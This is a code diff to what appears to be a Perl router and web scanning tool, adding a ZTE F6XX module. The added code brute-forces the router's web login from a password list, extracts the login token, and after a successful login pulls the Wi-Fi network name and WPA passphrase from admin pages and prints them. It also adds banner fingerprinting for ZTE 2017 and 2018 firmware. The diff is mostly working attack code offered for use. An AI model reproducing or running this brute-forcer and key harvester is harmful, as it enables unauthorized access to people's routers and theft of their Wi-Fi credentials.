@@ -665,8 +665,110 @@ sub passwordTest
 	}#ZTE ONT-4G 
 
 
-	############### ZTE-F6XX
-	if ($module eq "ZTE-F6XX")
+
+	############### ZTE-F6XX-2017
+	if ($module eq "ZTE-F6XX-2017")
+	{		
+		$headers->header("Referer" => $url);
+		$headers->header("Upgrade-Insecure-Requests" => 1);
+		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
+			
+
+		my @passwords_list = []; 
+		if ($passwords_file ne '' )
+		{
+			print "Archivo password";
+			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+			while (my $password=<MYINPUT>)
+			{ 						
+				push @passwords_list,$password; 
+			}
+		}
+		else
+		{
+			@passwords_list[0]=$password; 
+		}
+		
+		
+		foreach my $password (@passwords_list) 
+		{
+			$password =~ s/\n//g; 	
+						
+			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;
+			#getObj("Frm_Logintoken").value = "12";
+			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;
+
+
+			my $Frm_Logintoken = $1; 						
+			$password =~ s/\n//g; 				
+			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
+			my $hash_data = {"frashnum" => "",
+							"action" => "login",
+							"Frm_Logintoken" => $Frm_Logintoken,							
+							'Username' => $user, 
+							'Password' => $password
+					};	
+
+			my $post_data = convert_hash($hash_data);
+			
+			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;
+			my $status = $response->status_line;						
+			print "[+] user:$user password:$password status:$status\n";
+			#print($decoded_response);
+			if ($status =~ /302/m)
+			{	
+				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
+				my $response_headers = $response->headers_as_string;
+				my $SID;
+				if ($response_headers =~ /SID=([^;]+)/) {
+					$SID = $1;					
+				} 
+				
+				#get SSID
+				$headers->header("Origin" => $url);	
+				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
+				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
+				$decoded_response = $response->decoded_content;	
+				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
+				#$decoded_response =~ s/,''/,'0'/g;
+				$decoded_response =~ s/[^\x00-\x7f]//g;
+				$decoded_response =~ s/\\x2e/./g; 
+				$decoded_response =~ s/\\x20/ /g; 
+				$decoded_response =~ s/\\x5f/_/g; 
+				$decoded_response =~ s/\\x2d/-/g; 
+				$decoded_response =~ s/\\x22/"/g; 
+
+				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
+				my $ESSID;				
+				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
+				$ESSID = $1;					
+			
+				#get password
+				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
+				$decoded_response = $response->decoded_content;
+				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
+				$decoded_response =~ s/[^\x00-\x7f]//g;
+				$decoded_response =~ s/\\x2e/./g; 
+				$decoded_response =~ s/\\x20/ /g; 
+				$decoded_response =~ s/\\x5f/_/g; 
+				$decoded_response =~ s/\\x2d/-/g; 
+				$decoded_response =~ s/\\x22/"/g; 
+				
+				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
+				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
+				my $KeyPassphrase = $1; 									
+			
+				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
+				last;											
+			}
+		}				
+		close MYINPUT;	
+	}#ZTE-F6XX-2017 
+
+	############### ZTE-F6XX-2018
+	if ($module eq "ZTE-F6XX-2018")
 	{		
 		$headers->header("Referer" => $url);
 		$headers->header("Upgrade-Insecure-Requests" => 1);
@@ -767,7 +869,7 @@ sub passwordTest
 			}
 		}				
 		close MYINPUT;	
-	}#ZTE-F6XX 
+	}#ZTE-F6XX-2018 
 
 	
 
@@ -1429,7 +1531,14 @@ sub getData
 
 	if($decoded_header_response =~ /GASOLINERA/m)
 		{$type=$type."|"."GASOLINERA";} 		
-		
+
+	if($decoded_header_response =~ /2008-2017 ZTE Corporation/m)
+		{$type=$type."|"."ZTE-2017";} 
+	
+	if($decoded_header_response =~ /2008-2018 ZTE Corporation/m)
+		{$type=$type."|"."ZTE-2018";} 
+
+
 	if(($decoded_header_response =~ /You have logged out of the Cisco Router/i) || ($decoded_header_response =~ /Cisco RV340 Configuration Utility/i))
 		{$server="Cisco Router";} 	
 
@@ -1791,7 +1900,7 @@ sub checkVuln (){
 	# Fatal error: Uncaught exception 'Symfony\Component\Routing\Exception\ResourceNotFoundException'
 	#Stack trace
 	if($decoded_content =~ /undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information|E_WARNING/i)
-		{$vuln = "MensajeError";} 	
+		{$vuln = "MensajeError";}	
 			 			
 	if($decoded_content =~ /Access denied for/i)
 	{
@@ -1805,7 +1914,7 @@ sub checkVuln (){
 		{$vuln = "ListadoDirectorios";} 
 	
 	if($decoded_content =~ /HTTP_X_FORWARDED_HOST|HTTP_X_FORWARDED_SERVER|phpinfo\(\)/i)
-		{$vuln = "phpinfo";} 
+		{$vuln = "divulgacionInformacion";} 
 	
 	return $vuln;
 }
